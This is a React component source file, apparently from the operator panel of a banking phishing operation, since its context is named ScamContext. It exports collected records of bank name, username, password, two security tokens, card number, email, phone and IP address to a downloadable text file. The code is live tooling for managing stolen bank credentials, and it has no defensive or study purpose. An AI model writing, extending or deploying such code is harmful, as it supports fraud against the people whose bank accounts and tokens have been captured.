import { saveAs } from 'file-saver';
import React, { useContext, useEffect, useState } from 'react'
import { ScamContext } from '../../context/ScamContext';

export const BtnDownloadTxt = () => {

    const {users, selected, filteredType} = useContext(ScamContext);
    
    useEffect(() => {

    }, [users]);

    
    const downloadUsers = () => {
        const blob = new Blob(users.map(e => {
            return `==========
= banco: ${e.name}
= usuario: ${e.username}
= clave: ${e.password}
= token1: ${e.token1 == undefined  ? 'no tiene' : e.token1}
= token2: ${e.token2 == undefined  ? 'no tiene' : e.token2}
= tarjeta: ${e.tarjeta == undefined ? 'no tiene' : e.tarjeta}
= correo: ${e.correo  == undefined ? 'no tiene' : e.correo}
= cel: ${e.celular == undefined ? 'no tiene' : e.celular}
= ip: ${e.ip}
==========

`
        }), { type: 'type/plain;charset=utf-8' });
        saveAs(blob, `${selected}-${filteredType}-${users.length}.txt`)
    }

    return (
        <div className='flex flex-col'>
            <button 
                onClick={() => downloadUsers()}
                className='px-3 bg-[#0072FF] text-white rounded py-1'
            >Exportar txt</button>
        </div>
    )
}
